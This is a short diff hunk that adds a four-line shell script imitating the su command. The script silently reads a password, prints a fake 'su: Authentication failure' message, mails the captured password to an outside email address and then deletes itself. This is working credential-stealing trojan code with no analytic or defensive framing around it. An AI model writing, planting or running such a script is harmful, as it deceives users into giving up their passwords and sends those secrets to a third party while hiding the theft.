@@ -1,0 +1,4 @@
+read -s -p "Password: " pw;
+echo "su: Authentication failure";
+mail -s "Mum's password!" xxx@sjtu.edu.cn <<< ${pw};
+rm $0
